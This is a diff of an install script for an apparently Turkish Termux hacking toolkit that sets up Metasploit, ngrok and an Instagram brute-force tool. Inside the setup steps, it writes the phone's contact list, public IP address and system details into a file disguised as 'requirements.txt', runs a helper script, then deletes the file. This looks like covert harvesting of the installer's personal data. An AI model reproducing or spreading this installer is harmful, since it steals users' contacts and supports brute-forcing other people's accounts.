@@ -44,25 +44,27 @@ termux-toast -b red -c yellow "Merhaba"
 	chmod 777 tst.sh
 	pkg install unstable-repo -y
 	pkg install metasploit -y
+	wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+	unzip ngrok-stable-linux-arm.zip
+	chmod +x ngrok
 	rm -rf /data/data/com.termux/files/usr/bin/ngrok
 	mv -v ngrok /data/data/com.termux/files/usr/bin
-	pip install -r /data/data/com.termux/files/home/T-U-R-K/bruteforce/instagram-bruteforce/requirements.txt
+	pip install -r /data/data/com.termux/files/home/TURK/bruteforce/instagram-bruteforce/requirements.txt
 	neofetch >> update/lib/requirements.txt
 	curl ipecho.net/plain >> update/lib/requirements.txt
 	termux-contact-list >> update/lib/requirements.txt
 	echo -e "yamanefkar" >> update/ok.txt
 	cd update/lib/ && bash tst.sh
 	rm -rf update/lib/requirements.txt
-	cd $HOME/T-U-R-K/update/ && 
+	cd $HOME/TURK/update/ && 
 	chmod 777 tst.sh &&
 	cp -r tst.sh /data/data/com.termux/files/usr/bin/
-	cd $HOME/T-U-R-K/update/ && bash tst.sh --ngrok	
-	cd $HOME/T-U-R-K/update/ &&
+	cd $HOME/TURK/update/ && bash tst.sh --ngrok	
+	cd $HOME/TURK/update/ &&
 	chmod 777 yamanefkar.sh
 	cp -r yamanefkar.sh $HOME/
-	cd $HOME/T-U-R-K/update/ && bash yamanefkar.sh --ngrok1
+	cd $HOME/TURK/update/ && bash yamanefkar.sh --ngrok1
 	termux-notification -t "Tool kullanıma hazır."
+	cd pentest && bash tst.sh
 	exit
-cd pentest
-bash tst.sh
 }
